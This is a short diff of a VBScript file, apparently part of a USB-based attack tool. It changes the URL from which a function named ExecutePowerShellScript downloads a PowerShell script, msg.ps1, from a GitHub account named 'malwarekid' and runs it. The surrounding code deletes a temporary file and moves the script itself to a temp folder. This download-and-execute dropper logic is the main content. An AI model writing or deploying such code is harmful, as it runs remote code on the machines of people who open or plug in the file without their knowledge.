@@ -33,7 +33,7 @@ Function ExecutePowerShellScript(url)
         objFSO.DeleteFile tempScriptPath
     End If
 End Function
-url = "https://raw.githubusercontent.com/malwarekid/test/main/msg.ps1"
+url = "https://raw.githubusercontent.com/malwarekid/GoodUSB/master/msg.ps1"
 ExecutePowerShellScript url
 Sub MoveScriptToTemp
     Dim tempDir, scriptPath, destination
